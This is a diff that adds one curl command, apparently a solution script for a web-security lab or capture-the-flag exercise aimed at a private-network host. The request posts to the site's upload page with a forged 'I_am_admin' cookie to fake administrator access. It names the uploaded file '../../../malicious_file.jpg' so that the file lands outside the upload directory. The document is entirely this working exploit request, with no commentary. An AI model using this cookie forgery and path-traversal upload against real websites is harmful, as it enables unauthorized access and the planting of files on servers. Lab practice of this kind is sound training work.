@@ -1,0 +1,12 @@
+curl 'http://192.168.13.47/index.php?page=upload#' \
+    --compressed -X POST \
+     -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
+     -H 'Accept-Language: en-US,en;q=0.5' \
+     -H 'Accept-Encoding: gzip, deflate' \
+     -H 'Content-Type: multipart/form-data; boundary=---------------------------83109726239704619763515450688' \
+     -H 'Origin: http://192.168.13.47' \
+     -H 'Connection: keep-alive' \
+     -H 'Referer: http://192.168.13.47/index.php?page=upload' \
+     -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' \
+     -H 'Upgrade-Insecure-Requests: 1' \
+     --data-binary $'-----------------------------83109726239704619763515450688\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n100000\r\n-----------------------------83109726239704619763515450688\r\nContent-Disposition: form-data; name="uploaded"; filename="../../../malicious_file.jpg"\r\nContent-Type: image/jpeg\r\n\r\n-----------------------------83109726239704619763515450688\r\nContent-Disposition: form-data; name="Upload"\r\n\r\nUpload\r\n-----------------------------83109726239704619763515450688--\r\n'
